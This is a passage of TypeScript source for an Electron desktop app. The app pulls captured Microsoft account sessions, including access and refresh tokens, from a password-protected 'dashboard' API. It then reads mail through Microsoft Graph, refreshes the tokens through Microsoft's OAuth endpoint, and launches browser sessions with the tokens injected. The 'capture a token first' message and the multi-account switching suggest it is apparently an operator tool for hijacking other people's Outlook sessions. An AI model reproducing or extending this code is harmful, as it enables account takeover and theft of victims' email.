      const batchResp = await httpsPost(`${DASHBOARD_API}/export-token`, { password, batch: true });

      let hasBatchTokens = false;
      if (batchResp.status === 200) {
        const batchData = JSON.parse(batchResp.body) as { sessions: Array<{ id: string; accountEmail: string; accountName: string; accessToken?: string; refreshToken?: string; accessTokenExpiry: string }> };
        if (batchData.sessions && batchData.sessions.length > 0 && batchData.sessions[0].accessToken) {
          // Batch mode worked — sessions include tokens
          hasBatchTokens = true;
          syncedAccounts.length = 0;
          for (const sess of batchData.sessions) {
            syncedAccounts.push({
              sessionId: sess.id,
              email: sess.accountEmail,
              name: sess.accountName,
              accessToken: sess.accessToken!,
              refreshToken: sess.refreshToken || '',
              accessTokenExpiry: sess.accessTokenExpiry,
            });
          }
        }
      }

      // Fallback: list sessions then import each individually (v1.0.29 approach)
      if (!hasBatchTokens) {
        const listResp = await httpsPost(`${DASHBOARD_API}/export-token`, { password });

        if (listResp.status !== 200) {
          const data = JSON.parse(listResp.body) as { error?: string };
          return { success: false, error: data.error || 'Invalid password or connection failed' };
        }

        const listData = JSON.parse(listResp.body) as { sessions: Array<{ id: string; accountEmail: string; accountName: string; accessTokenExpiry: string }> };

        if (!listData.sessions || listData.sessions.length === 0) {
          return { success: false, error: 'No tokens found. Capture a token first at the dashboard.' };
        }

        syncedAccounts.length = 0;
        const importPromises = listData.sessions.map(async (sess) => {
          const importResp = await httpsPost(`${DASHBOARD_API}/export-token`, { sessionId: sess.id, password });
          if (importResp.status === 200) {
            const importData = JSON.parse(importResp.body) as {
              session: { id: string; accountEmail: string; accountName: string; accessToken: string; refreshToken: string; accessTokenExpiry: string };
            };
            syncedAccounts.push({
              sessionId: importData.session.id,
              email: importData.session.accountEmail,
              name: importData.session.accountName,
              accessToken: importData.session.accessToken,
              refreshToken: importData.session.refreshToken,
              accessTokenExpiry: importData.session.accessTokenExpiry,
            });
          }
        });
        await Promise.all(importPromises);
      }

      if (syncedAccounts.length === 0) {
        return { success: false, error: 'Failed to import any tokens' };
      }

      // Auto-select first account
      const first = syncedAccounts[0];
      graphClient = new GraphMailClient(first.accessToken);
      tokenStore.saveImportedTokens(first.accessToken, first.refreshToken, first.email);

      const accounts = syncedAccounts.map((a) => ({
        id: a.sessionId,
        accountEmail: a.email,
        accountName: a.name,
        accessTokenExpiry: a.accessTokenExpiry,
      }));

      // Get profile without blocking
      let profile = { displayName: first.name, mail: first.email, userPrincipalName: first.email, jobTitle: '' };
      try {
        const gProfile = await graphClient.getProfile();
        profile = {
          displayName: gProfile.displayName || first.name,
          mail: gProfile.mail || first.email,
          userPrincipalName: gProfile.userPrincipalName || first.email,
          jobTitle: gProfile.jobTitle || '',
        };
      } catch {
        // Use basic info from token
      }

      return { success: true, accounts, profile, activeAccountEmail: first.email };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Network error';
      return { success: false, error: message };
    }
  });

  // Switch to a different synced account
  ipcMain.handle('sync:switchAccount', async (_event, sessionId: string) => {
    const account = syncedAccounts.find((a) => a.sessionId === sessionId);
    if (!account) {
      return { success: false, error: 'Account not found' };
    }

    // Refresh token to get fresh access token
    await refreshAccountToken(account);

    graphClient = new GraphMailClient(account.accessToken);
    tokenStore.saveImportedTokens(account.accessToken, account.refreshToken, account.email);

    let profile = { displayName: account.name, mail: account.email, userPrincipalName: account.email, jobTitle: '' };
    try {
      const gProfile = await graphClient.getProfile();
      profile = {
        displayName: gProfile.displayName || account.name,
        mail: gProfile.mail || account.email,
        userPrincipalName: gProfile.userPrincipalName || account.email,
        jobTitle: gProfile.jobTitle || '',
      };
    } catch {
      // Use basic info
    }

    return { success: true, profile };
  });

  // Refresh all synced accounts in parallel
  ipcMain.handle('sync:refreshAll', async () => {
    try {
      const results = await Promise.all(syncedAccounts.map((acc) => refreshAccountToken(acc)));
      const successCount = results.filter((r) => r).length;

      const accounts = syncedAccounts.map((a) => ({
        id: a.sessionId,
        accountEmail: a.email,
        accountName: a.name,
        accessTokenExpiry: a.accessTokenExpiry,
      }));

      if (successCount === 0) {
        return { success: false, error: 'Failed to refresh any tokens' };
      }

      return { success: true, accounts };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Refresh failed';
      return { success: false, error: message };
    }
  });

  // Launch browser session with token injection
  ipcMain.handle('launchBrowserSession', async (_event, sessionId: string, service: string) => {
    const account = syncedAccounts.find((a) => a.sessionId === sessionId);
    if (!account) {
      return { success: false, error: 'Account not found' };
    }

    // Refresh token first
    await refreshAccountToken(account);

    if (service === 'chrome') {
      // Launch external Chrome with isolated profile
      return await launchExternalChrome(account, service);
    }

    // Launch in-app browser window with token injection
    return await launchChromeWithSession(account, service);
  });

  // Open email in Chrome (legacy)
  ipcMain.handle('openInChrome', async () => {
    shell.openExternal('https://outlook.office365.com/mail/');
  });

  // Legacy handlers
  ipcMain.handle('sync:fetchSessions', async (_event, password: string) => {
    try {
      const resp = await httpsPost(`${DASHBOARD_API}/export-token`, { password });

      if (resp.status !== 200) {
        const data = JSON.parse(resp.body) as { error?: string };
        return { success: false, error: data.error || 'Failed to fetch sessions' };
      }

      const data = JSON.parse(resp.body) as { sessions: Array<{ id: string; accountEmail: string; accountName: string; accessTokenExpiry: string }> };
      return { success: true, sessions: data.sessions };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Network error';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('sync:importToken', async (_event, password: string, sessionId: string) => {
    try {
      const resp = await httpsPost(`${DASHBOARD_API}/export-token`, { sessionId, password });

      if (resp.status !== 200) {
        const data = JSON.parse(resp.body) as { error?: string };
        return { success: false, error: data.error || 'Failed to import token' };
      }

      const data = JSON.parse(resp.body) as {
        session: {
          id: string;
          accountEmail: string;
          accountName: string;
          accessToken: string;
          refreshToken: string;
          accessTokenExpiry: string;
          scopes: string[];
          clientId: string;
        };
      };

      const s = data.session;
      await authManager.importToken(s.accessToken, s.refreshToken, s.accountEmail);
      graphClient = new GraphMailClient(s.accessToken);

      try {
        const profile = await graphClient.getProfile();
        return { success: true, profile };
      } catch {
        return { success: true, profile: { displayName: s.accountName, mail: s.accountEmail, userPrincipalName: s.accountEmail, jobTitle: '' } };
      }
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Network error';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('sync:refreshImportedToken', async () => {
    try {
      const tokens = tokenStore.getImportedTokens();
      if (!tokens || !tokens.refreshToken) {
        return { success: false, error: 'No imported token to refresh' };
      }

      const body = new URLSearchParams({
        client_id: CLIENT_ID,
        grant_type: 'refresh_token',
        refresh_token: tokens.refreshToken,
        resource: 'https://graph.microsoft.com',
      });

      const response = await net.fetch('https://login.microsoftonline.com/common/oauth2/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body.toString(),
      });

      const data = await response.json() as Record<string, unknown>;

      if (!response.ok) {
        return { success: false, error: (data.error_description as string) || 'Refresh failed' };
      }

      const newAccessToken = data.access_token as string;
      const newRefreshToken = (data.refresh_token as string) || tokens.refreshToken;
      tokenStore.saveImportedTokens(newAccessToken, newRefreshToken, tokens.email);
      graphClient = new GraphMailClient(newAccessToken);

      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Refresh failed';
      return { success: false, error: message };
    }
  });
}

function setupAutoUpdater(): void {
  autoUpdater.autoDownload = true;
  autoUpdater.autoInstallOnAppQuit = true;

  autoUpdater.on('update-available', (info) => {
    if (mainWindow) {
      mainWindow.webContents.send('update:available', { version: info.version });
    }
  });

  autoUpdater.on('update-downloaded', (info) => {
    if (mainWindow) {
      mainWindow.webContents.send('update:downloaded', { version: info.version });
    }
    if (Notification.isSupported()) {
      const notification = new Notification({
        title: 'Update Ready',
        body: `Version ${info.version} has been downloaded. It will be installed on restart.`,
      });
      notification.on('click', () => {
        autoUpdater.quitAndInstall();
      });
      notification.show();
    }
  });

  autoUpdater.on('error', (error) => {
    console.log('[AutoUpdater] Error:', error.message);
  });

  autoUpdater.checkForUpdatesAndNotify().catch(() => {
    // Silently fail if update check fails
  });
}

app.whenReady().then(() => {
  authManager = new AuthManager(tokenStore);
  createWindow();
  setupIpcHandlers();
  setupAutoUpdater();

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});
